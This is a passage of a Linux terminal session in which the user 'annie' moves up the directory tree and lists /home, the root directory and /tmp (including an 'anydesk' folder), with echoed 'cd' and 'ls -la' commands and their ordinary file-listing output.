drwxr-xr-x 17 annie annie 4096 Mar 23  2022 ..
annie@desktop:/home/annie$ cd ..
cd ..
annie@desktop:/home$ ls -la
ls -la
total 12
drwxr-xr-x  3 root  root  4096 Mar 23  2022 .
drwxr-xr-x 22 root  root  4096 Mar 23  2022 ..
drwxr-xr-x 17 annie annie 4096 Mar 23  2022 annie
annie@desktop:/home$ cd ..
cd ..
annie@desktop:/$ ls -la
ls -la
total 970064
drwxr-xr-x  22 root root      4096 Mar 23  2022 .
drwxr-xr-x  22 root root      4096 Mar 23  2022 ..
drwxr-xr-x   2 root root      4096 Mar 23  2022 bin
drwxr-xr-x   3 root root      4096 Mar 23  2022 boot
drwxr-xr-x  17 root root      3680 Jun 13 12:40 dev
drwxr-xr-x 109 root root      4096 May 14  2022 etc
drwxr-xr-x   3 root root      4096 Mar 23  2022 home
lrwxrwxrwx   1 root root        34 Mar 23  2022 initrd.img -> boot/initrd.img-4.15.0-173-generic
lrwxrwxrwx   1 root root        33 Mar 23  2022 initrd.img.old -> boot/initrd.img-4.15.0-76-generic
drwxr-xr-x  18 root root      4096 Mar 23  2022 lib
drwxr-xr-x   2 root root      4096 Mar 23  2022 lib64
drwx------   2 root root     16384 Mar 23  2022 lost+found
drwxr-xr-x   4 root root      4096 Mar 23  2022 media
drwxr-xr-x   2 root root      4096 Feb  3  2020 mnt
drwxr-xr-x   2 root root      4096 Mar 23  2022 opt
dr-xr-xr-x 139 root root         0 Jun 13 12:40 proc
drwx------   5 root root      4096 Mar 23  2022 root
drwxr-xr-x  21 root root       640 Jun 13 13:49 run
drwxr-xr-x   2 root root     12288 Mar 23  2022 sbin
drwxr-xr-x   2 root root      4096 Feb  3  2020 srv
-rw-------   1 root root 993244160 Mar 23  2022 swapfile
dr-xr-xr-x  13 root root         0 Jun 13 12:40 sys
drwxrwxrwt  14 root root      4096 Jun 13 13:52 tmp
drwxr-xr-x  10 root root      4096 Mar 23  2022 usr
drwxr-xr-x  12 root root      4096 Mar 23  2022 var
lrwxrwxrwx   1 root root        31 Mar 23  2022 vmlinuz -> boot/vmlinuz-4.15.0-173-generic
lrwxrwxrwx   1 root root        30 Mar 23  2022 vmlinuz.old -> boot/vmlinuz-4.15.0-76-generic
annie@desktop:/$ ls -la tmp
ls -la tmp
total 92
drwxrwxrwt 14 root  root   4096 Jun 13 13:52 .
drwxr-xr-x 22 root  root   4096 Mar 23  2022 ..
drwxrwxrwt  2 root  root   4096 Jun 13 12:45 .ICE-unix
drwxrwxrwt  2 root  root   4096 Jun 13 12:40 .Test-unix
-r--r--r--  1 root  root     11 Jun 13 12:40 .X10-lock
-r--r--r--  1 gdm   gdm      11 Jun 13 12:45 .X1024-lock
drwxrwxrwt  2 root  root   4096 Jun 13 12:45 .X11-unix
drwxrwxrwt  2 root  root   4096 Jun 13 12:40 .XIM-unix
drwxrwxrwt  2 root  root   4096 Jun 13 12:40 .font-unix
drwxrwxrwx  2 annie annie 28672 Jun 13 13:52 anydesk
drwx------  3 root  root   4096 Jun 13 12:40 systemd-private-7ca14f2d26ce4dd49c408411f58174b4-ModemManager.service-APe311
drwx------  3 root  root   4096 Jun 13 12:45 systemd-private-7ca14f2d26ce4dd49c408411f58174b4-bolt.service-xFgXJT
drwx------  3 root  root   4096 Jun 13 12:45 systemd-private-7ca14f2d26ce4dd49c408411f58174b4-colord.service-rJow5x
drwx------  3 root  root   4096 Jun 13 12:41 systemd-private-7ca14f2d26ce4dd49c408411f58174b4-rtkit-daemon.service-LB3OnB
drwx------  3 root  root   4096 Jun 13 12:40 systemd-private-7ca14f2d26ce4dd49c408411f58174b4-systemd-resolved.service-TdhIlP
drwx------  3 root  root   4096 Jun 13 12:40 systemd-private-7ca14f2d26ce4dd49c408411f58174b4-systemd-timesyncd.service-0lF5ro
annie@desktop:/$   
```
